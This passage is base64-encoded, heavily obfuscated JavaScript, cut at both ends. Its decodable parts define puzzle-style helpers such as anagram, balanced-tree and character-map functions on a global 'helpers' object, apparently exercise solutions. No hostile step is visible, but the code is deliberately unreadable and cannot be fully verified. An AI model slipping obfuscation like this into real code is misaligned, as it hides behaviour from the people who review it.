gzMyJdPWZ1bmN0aW9uKC4uLl9fX192dDApe3JldHVybiBfX19fX2g2eCgyOSw2Myx7WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwMzhcdTAwMzciXTpfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwMzhcdTAwMzciXSxbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMFx1MDA2NVx1MDAzNCJdOnt9fSxfX19fdnQwKVsiXHg2ZVx4NjVceDc4XHg3NCJdKClbIlx1MDA3Nlx1MDA2MVx1MDA2Y1x1MDA3NVx1MDA2NSJdfTtfX19fX3k4N1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDYyXHUwMDZjXHUwMDM3Il09ZnVuY3Rpb24oX19fX19oNngsX19fX3Z0MCl7ZnVuY3Rpb24qX19fX19fa3k2KF9fX19fX2t5NixfX19fX190aTUsX19fX194cHUsX19fYTlnLF9fX19fX2x4ZT17WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXTp7fX0pe3doaWxlKF9fX19fX2t5NitfX19fX190aTUrX19fX194cHUrX19fYTlnIT09LTU1KXt3aXRoKF9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzN1x4NmVceDZkIl18fF9fX19fX2x4ZSl7c3dpdGNoKF9fX19fX2t5NitfX19fX190aTUrX19fX194cHUrX19fYTlnKXtjYXNlIF9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc4XHg2NVx4NjgiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3Nlx4NzlceDM2Il0rMzAyOmNhc2UgMzU6W19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDY1XHUwMDY4Il1bIlx4NWZceDVmXHg1Zlx4MzVceDMzXHgzOSJdLF9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDY1XHUwMDY4Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NzZceDc5XHgzNiJdXT1bNTksMjE4XTtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzN1x1MDA2ZVx1MDA2ZCJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDY1XHUwMDY4Il0sX19fX19fa3k2Kz0tMTEwLF9fX19fX3RpNSs9MjM4LF9fX19feHB1Kz0tMjQ5LF9fX2E5Zys9MTc1O2JyZWFrO2lmKF9fX2E5Zz4tKF9fX19fX3RpNSstMTUpKXtfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzdceDZlXHg2ZCJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc4XHg2NVx4NjgiXSxfX19fX19reTYrPS0xMTAsX19fX19fdGk1Kz0yMzgsX19fX194cHUrPS0yNDksX19fYTlnKz0xNzU7YnJlYWt9ZGVmYXVsdDpjYXNlIDEyMjpjYXNlIDg4OmlmKF9fX19jdTcpX19fX3BsdS5uZXh0PW5ldyBfX19fX3k4N1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM2XHUwMDczXHUwMDMzIl0oX19fX2N1Nyk7cmV0dXJuIF9fX196dHE9dHJ1ZSxfX19fXzBheC5uZXh0O19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDZlXHUwMDZkIl09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg2N1x4NjFceDM1Il0sX19fX19fdGk1Kz0tNTc7YnJlYWs7Y2FzZSAxNDk6Y2FzZS01NzpjYXNlLTMyOl9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDZlXHUwMDZkIl09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXSxfX19fX19reTYrPS0xMTAsX19fX19fdGk1Kz0yMzgsX19fX194cHUrPS0zMTcsX19fYTlnKz0xNzU7YnJlYWs7aWYoX19fYTlnIT0tMjAwKXtfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzdceDZlXHg2ZCJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDY1XHUwMDY4Il0sX19fX19fa3k2Kz0tMTcxLF9fX19fX3RpNSs9MTIyLF9fX19feHB1Kz0tMzE3LF9fX2E5Zys9MTc1O2JyZWFrfWNhc2UgMjI0OmNhc2UgMTM1Ol9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc4XHg2NVx4NjgiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzFceDcwXHg3OSJdPV9fX192dDA7d2hpbGUoX19fX19vb2ghPT1fX19fX18zaDFbM118fF9fX18xcHkhPT1fX19fX18zaDFbM10pe19fX19fbDMyPShfX19fX29vaD9fX19fX29vaC52YWw6X19fX19fM2gxW19fX19fX3RpNSstMzUzXSkrKF9fX18xcHk/X19fXzFweS52YWw6X19fX19fM2gxW19fX19feHB1KzEwNl0pK19fX19jdTc7X19fX2N1Nz1NYXRoLmZsb29yKF9fX19fbDMyL19fX19fXzNoMVs0XSk7X19fX3BsdS5uZXh0PW5ldyBfX19fX3k4N1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM2XHUwMDczXHUwMDMzIl0oX19fX19sMzIlX19fX19fM2gxWzRdKTtfX19fcGx1PV9fX19wbHUubmV4dDtfX19fX29vaD1fX19fX29vaD9fX19fX29vaC5uZXh0Ol9fX19fXzNoMVtfX19fX3hwdSsxMDddO19fX18xcHk9X19fXzFweT9fX19fMXB5Lm5leHQ6X19fX19fM2gxWzNdfV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDZlXHUwMDZkIl09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXSxfX19fX19reTYrPTE2LF9fX19fX3RpNSs9MTcyLF9fX19feHB1Kz0tMTAzLF9fX2E5Zys9LTIxODticmVhaztjYXNlIF9fX19fX2t5Ni0gLTExMDpjYXNlLTEzMjpfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3OFx4NjVceDY4Il1bIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2Y1x4NzUiXT1fX19fXzBheDtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3OFx1MDA2NVx1MDA2OCJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmZceDZmXHg2OCJdPV9fX19faDZ4O19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDZlXHUwMDZkIl09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXSxfX19fX19reTYrPTYxLF9fX19fX3RpNSs9MTE2O2JyZWFrO2lmKCEoX19fYTlnIT1fX19fX190aTUrLTIyMykpe19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDZlXHUwMDZkIl09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXSxfX19fX19reTYrPTE3MSxfX19fX190aTUrPS0xODAsX19fX194cHUrPS0xMDMsX19fYTlnKz0tNzc7YnJlYWt9Y2FzZSBfX19fX3hwdS0xNzU6Y2FzZSAyNDc6W19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc4XHg2NVx4NjgiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM1XHUwMDMzXHUwMDM5Il0sX19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc2XHUwMDc5XHUwMDM2Il1dPVsyMjEsLTIyMV07X19fX194ZWhbIlx4NWZceDVmXHg1Zlx4NWZceDYzXHg3NVx4MzciXT1fX19fX18zaDFbMl07X19fX194ZWhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Y1x4MzNceDMyIl09X19fX19fM2gxW19fX19fX2t5NisxOTBdO19fX19feGVoWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzBcdTAwNjFcdTAwNzgiXT1uZXcgX19fX195ODdbIlx4NWZceDVmXHg1Zlx4MzZceDczXHgzMyJdKF9fX19fXzNoMVtfX19fX3hwdSs1Nl0pO19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzN1x4NmVceDZkIl09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NzhceDY1XHg2OCJdLF9fX19fX2t5Nis9MzYsX19fX19fdGk1Kz0tNCxfX19fX3hwdSs9LTUwLF9fX2E5Zys9LTI3MTticmVhaztpZihfX19fX190aTU9PS0oX19fX19fa3k2KzQxMikpe19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzN1x4NmVceDZkIl09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NzhceDY1XHg2OCJdLF9fX19fX2t5Nis9MTEzLF9fX19fX3RpNSs9Mjg0LF9fX19feHB1Kz0tMTUzLF9fX2E5Zys9LTQ4OTticmVha31jYXNlIDE5MTpjYXNlLTIzMTpbX19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXVsiXHg1Zlx4NWZceDVmXHgzNVx4MzNceDM5Il0sX19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NzhceDY1XHg2OCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzZcdTAwNzlcdTAwMzYiXV09WzE4MywxNTFdO19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDZlXHUwMDZkIl09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNjVcdTAwNjgiXSxfX19fX19reTYrPS0xMTAsX19fX19fdGk1Kz0yOTYsX19fX194cHUrPTEwMyxfX19hOWcrPTc3O2JyZWFrO2lmKF9fX2E5Zz4tMTAyKXtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzN1x1MDA2ZVx1MDA2ZCJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDY1XHUwMDY4Il0sX19fX19fa3k2Kz0tMTEwLF9fX19fX3RpNSs9Mjk2LF9fX19feHB1Kz0xMDMsX19fYTlnKz03NzticmVha319fX19dmFyIF9fX196dHE7dmFyIF9fX19fX3RpNT1fX19fX19reTYoLTE4OCwyNDMsLTU0LDI0NilbIlx1MDA2ZVx1MDA2NVx1MDA3OFx1MDA3NCJdKClbIlx1MDA3Nlx1MDA2MVx1MDA2Y1x1MDA3NVx1MDA2NSJdO2lmKF9fX196dHEpe3JldHVybiBfX19fX190aTV9fTtyZXR1cm4gX19fX19fc244WyJceDVmXHg1Zlx4NWZceDc5XHgzMVx4NzMiXT10cnVlLGNvbnNvbGUubG9nKF9fX19feTg3WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDYyXHg2Y1x4MzciXSk7X19fX3Z0MCs9MTA4LF9fX19fX2t5Nis9Mjg1O2JyZWFrO2lmKF9fX192dDAhPTQ4KXtfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHg3MVx4NzJceDc2Il09X19fX3p0cVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc5XHUwMDM4XHUwMDM3Il0sX19fX3Z0MCs9LTUsX19fX19fa3k2Kz0xNjA7YnJlYWt9Y2FzZSBfX19fdnQwLSAtMjA2Ol9fX196dHFbIlx4NWZceDVmXHg1Zlx4NWZceDcxXHg3Mlx4NzYiXT1fX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzRcdTAwNmZcdTAwNjUiXSxfX19fdnQwKz0yMjUsX19fX19fa3k2Kz0tMTQzO2JyZWFrfX19fTtfX19fX19zbjhbIlx4NWZceDVmXHg1Zlx4NzlceDMxXHg3MyJdPXVuZGVmaW5lZDtfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NmVceDY4XHg2YiJdPV9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3M1x4NmVceDM4Il0sX19fX19oNngrPTE4NTticmVhaztjYXNlIF9fX19faDZ4IT0tNDYmJl9fX19faDZ4LSAtNDU6W19fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM2XHUwMDY4XHUwMDc2Il1bIlx4NWZceDVmXHg1Zlx4NjJceDY3XHg2ZiJdXT1bMTMzXTtfX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZVx1MDA2OFx1MDA2YiJdPV9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzOFx4NjFceDZhIl0sX19fX19oNngrPS03NyxfX19fdnQwKz0xNTE7YnJlYWt9fX19dmFyIF9fX19feHB1O3ZhciBfX19fX2g2eD1fX19fX190aTUoLTE3MywxOTYpWyJcdTAwNmVcdTAwNjVcdTAwNzhcdTAwNzQiXSgpWyJcdTAwNzZcdTAwNjFcdTAwNmNcdTAwNzVcdTAwNjUiXTtpZihfX19fX3hwdSl7cmV0dXJuIF9fX19faDZ4fX07aWYoX19fX194cHUoKSl7aWYoIlx4NWFceDQxXHg3Nlx4NzRceDRlXHg2MyIrIlx1MDA2ZSIgaW4gX19fX19fbHhlKXtfX19fX2g2eCgpfWZ1bmN0aW9uIF9fX19faDZ4KCl7ZnVuY3Rpb24qX19fX19fdGk1KF9fX19faDZ4LF9fX192dDAsX19fYTlnLF9fX19fX2t5NixfX19fX19seGU9e1siXHg1Zlx4NWZceDVmXHg2ZVx4NmNceDM4Il06e319LF9fX196dHEpe3doaWxlKF9fX19faDZ4K19fX192dDArX19fYTlnK19fX19fX2t5NiE9PTY3KXt3aXRoKF9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il18fF9fX19fX2x4ZSl7c3dpdGNoKF9fX19faDZ4K19fX192dDArX19fYTlnK19fX19fX2t5Nil7Y2FzZS0yMDM6Y2FzZS03OTpjYXNlIF9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg2ZVx4NmNceDM4Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Nlx1MDA3YVx1MDA2YiJdKzE4NTpbX19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmVcdTAwNmNcdTAwMzgiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc2XHg3YVx4NmIiXV09Wy0zNF07cmV0dXJuIF9fX19fYWF4O19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjVcdTAwNzZcdTAwMzAiXSxfX19fX2g2eCs9LTMwMyxfX19fdnQwKz0tMjI5LF9fX2E5Zys9MzAsX19fX19fa3k2Kz01MDY7YnJlYWs7Y2FzZSBfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NmVceDZjXHgzOCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzZcdTAwN2FcdTAwNmIiXSsxODY6cmV0dXJuIF9fX19fYWF4O19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg3Nlx4MzAiXSxfX19fX2g2eCs9LTE4LF9fX192dDArPS0xMCxfX19hOWcrPS0xMzEsX19fX19fa3k2Kz0xNjI7YnJlYWs7Y2FzZSBfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZVx1MDA2Y1x1MDAzOCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzZcdTAwN2FcdTAwNmIiXSsyMDg6Y2FzZS0yNDM6Y2FzZS0yMzQ6W19fX2ltcVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg3N1x4NmIiXV09X19fX3p0cTtfX19pbXFbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2OVx4NjhceDdhIl09KDEsX19fbmw4WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzRceDM5XHg2OCJdKShfX19pbXFbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NzdceDZiIl0pO3JldHVybiBfX19pbXFbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2OVx4NjhceDdhIl0hPT1JbmZpbml0eTtyZXR1cm4gdW5kZWZpbmVkO2Nhc2UgX19fX3Z0MC0xNzpbX19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmVcdTAwNmNcdTAwMzgiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc2XHg3YVx4NmIiXV09WzM0XTtfX19ubDhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzNFx1MDAzOVx1MDA2OCJdPWZ1bmN0aW9uKC4uLl9fX19faDZ4KXtyZXR1cm4gX19fX19fdGk1KC0xNjMsMzk0LC01Nyw1OSx7WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmVcdTAwNmNcdTAwMzgiXTpfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZVx1MDA2Y1x1MDAzOCJdLFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY1XHUwMDc2XHUwMDMwIl06e319LF9fX19faDZ4KVsiXHg2ZVx4NjVceDc4XHg3NCJdKClbIlx4NzZceDYxXHg2Y1x4NzVceDY1Il19O19fX25sOFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcyXHUwMDYyXHUwMDMxIl09ZnVuY3Rpb24oLi4uX19fX19oNngpe3JldHVybiBfX19fX190aTUoLTE2MywzOTQsLTUwLDYxLHtbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZVx1MDA2Y1x1MDAzOCJdOl9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZlXHUwMDZjXHUwMDM4Il0sWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjlcdTAwNmRcdTAwNzEiXTp7fX0sX19fX19oNngpWyJceDZlXHg2NVx4NzhceDc0Il0oKVsiXHg3Nlx4NjFceDZjXHg3NVx4NjUiXX07X19fbmw4WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDMyXHg3NFx4NzciXT1mdW5jdGlvbiguLi5fX19fX2g2eCl7cmV0dXJuIF9fX19fX3RpNSgtMzEsLTE2OCwxNDEsMSx7WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmVcdTAwNmNcdTAwMzgiXTpfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZVx1MDA2Y1x1MDAzOCJdLFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc5XHUwMDMwXHUwMDM1Il06e319LF9fX19faDZ4KVsiXHg2ZVx4NjVceDc4XHg3NCJdKClbIlx1MDA3Nlx1MDA2MVx1MDA2Y1x1MDA3NVx1MDA2NSJdfTtfX19ubDhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjhceDM1XHg2ZiJdPWZ1bmN0aW9uKC4uLl9fX19faDZ4KXtyZXR1cm4gX19fX19fdGk1KDE1MywtMTQyLC0xOCwtOTAse1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZlXHUwMDZjXHUwMDM4Il06X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmVcdTAwNmNcdTAwMzgiXSxbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Nlx1MDA3MVx1MDAzOCJdOnt9fSxfX19fX2g2eClbIlx1MDA2ZVx1MDA2NVx1MDA3OFx1MDA3NCJdKClbIlx4NzZceDYxXHg2Y1x4NzVceDY1Il19O3JldHVybiBfX19fX3hwdT10cnVlLHdpbmRvd1siXHUwMDVmXHUwMDVmXHUwMDQ3XHUwMDRjXHUwMDRmXHUwMDQyIisiXHUwMDQxXHUwMDRjXHUwMDVmXHUwMDVmXHUwMDQ4XHUwMDQ1IisiXHUwMDRjXHUwMDUwXHUwMDQ1XHUwMDUyXHUwMDUzXHUwMDVmIisiXHg1ZiJdPXtidWlsZENoYXJhY3Rlck1hcDpfX19ubDhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2OFx1MDAzNVx1MDA2ZiJdLGlzQW5hZ3JhbXM6X19fbmw4WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzJcdTAwNzRcdTAwNzciXSxpc0JhbGFuY2VkOl9fX25sOFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcyXHUwMDYyXHUwMDMxIl0sZ2V0SGVpZ2h0QmFsYW5jZWQ6X19fbmw4WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzRcdTAwMzlcdTAwNjgiXX07X19fX19oNngrPTUwMixfX19fdnQwKz0tMTY0LF9fX2E5Zys9LTE2MyxfX19fX19reTYrPS0yODA7YnJlYWs7Y2FzZSAyMzM6W19fX19fX2V2MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY5XHgzOVx4MzIiXV09X19fX3p0cTtfX19fX19ldjBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3OFx1MDA3OVx1MDA3NSJdPWZ1bmN0aW9uKl9fX19faDZ4KF9fX192dDAsX19fYTlnLF9fX19fX2t5NixfX19fX19seGU9e1siXHg1Zlx4NWZceDVmXHg1Zlx4MzlceDM5XHgzMSJdOnt9fSl7d2hpbGUoX19fX3Z0MCtfX19hOWcrX19fX19fa3k2IT09LTIwMSl7d2l0aChfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3NFx1MDA3N1x1MDA2MiJdfHxfX19fX19seGUpe3N3aXRjaChfX19fdnQwK19fX2E5ZytfX19fX19reTYpe2Nhc2UtNDQ6X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHgzOVx4MzlceDMxIl1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Nlx1MDAzNlx1MDA2YSJdPU1hdGguYWJzKF9fX19fX2ZpYy1fX19jajkpO2lmKF9fX19fX2ZpYz09PUluZmluaXR5fHxfX19jajk9PT1JbmZpbml0eXx8X19fdjZqPl9fX19fXzNoMVtfX19hOWcrLTRdKXtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3NFx1MDA3N1x1MDA2MiJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzlceDM5XHgzMSJdLF9fX2E5Zys9LTI0MyxfX19fX19reTYrPTI2MDticmVha31lbHNle19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc0XHUwMDc3XHUwMDYyIl09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHgzOVx4MzlceDMxIl0sX19fYTlnKz0xNDYsX19fX19fa3k2Kz0tMjMzO2JyZWFrfWNhc2UgX19fX19fa3k2LSAtMjA0OnJldHVybiBfX19fX19ldjBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3N1x1MDA2M1x1MDAzMSJdPXRydWUsLV9fX19fXzNoMVtfX19fdnQwKzRdO19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg3NFx4NzdceDYyIl09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHgzOVx4MzlceDMxIl0sX19fX3Z0MCs9NzcsX19fYTlnKz0tMTA5LF9fX19fX2t5Nis9LTEyODticmVhaztjYXNlIF9fX19fX2t5Ni0xNzA6W19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzlceDM5XHgzMSJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzVcdTAwNmJcdTAwMzciXSxfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDM5XHgzOVx4MzEiXVsiXHg1Zlx4NWZceDVmXHg3NFx4NjFceDc0Il1dPVstMjAsMTY3XTtpZighX19fX19fZXYwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjlceDM5XHgzMiJdKXtfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NzRceDc3XHg2MiJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzlceDM5XHgzMSJdLF9fX192dDArPS0xMjUsX19fYTlnKz00OTksX19fX19fa3k2Kz0tMzgyO2JyZWFrfWVsc2V7X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzRcdTAwNzdcdTAwNjIiXT1fX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDM5XHgzOVx4MzEiXSxfX19fdnQwKz0tNDgsX19fYTlnKz0zOTAsX19fX19fa3k2Kz0tNTEwO2JyZWFrfWNhc2UtMTU4OmNhc2UgX19fYTlnLTg6X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzRcdTAwNzdcdTAwNjIiXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOVx1MDAzOVx1MDAzMSJdLF9fX192dDArPTI3NixfX19hOWcrPS00NjEsX19fX19fa3k2Kz0tNTc7YnJlYWs7Y2FzZS0xMzE6Y2FzZS0yMjM6Y2FzZSAyMzg6X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzlcdTAwMzlcdTAwMzEiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NjFceDM0XHgzOSJdPU1hdGgubWF4KF9fX19fX2ZpYyxfX19jajkpK19fX19fXzNoMVsxXTtyZXR1cm4gX19fX19fZXYwWyJceDVmXHg1Zlx4NWZceDc3XHg2M1x4MzEiXT10cnVlLF9fX19hNDk7X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzRcdTAwNzdcdTAwNjIiXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNlx1MDA2MSJdLF9fX192dDArPS0zNTYsX19fYTlnKz03MixfX19fX19reTYrPTIxNDticmVhaztjYXNlLTI3OnJldHVybiBfX19fX19ldjBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3N1x1MDA2M1x1MDAzMSJdPXRydWUsSW5maW5pdHk7X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDc0XHg3N1x4NjIiXT1fX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDM5XHgzOVx4MzEiXSxfX19hOWcrPTM4OSxfX19fX19reTYrPS00OTM7YnJlYWs7Y2FzZS0zNDpjYXNlLTIyNzpfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3NFx1MDA3N1x1MDA2MiJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZiXHUwMDM5XHUwMDM4Il0sX19fX3Z0MCs9MTM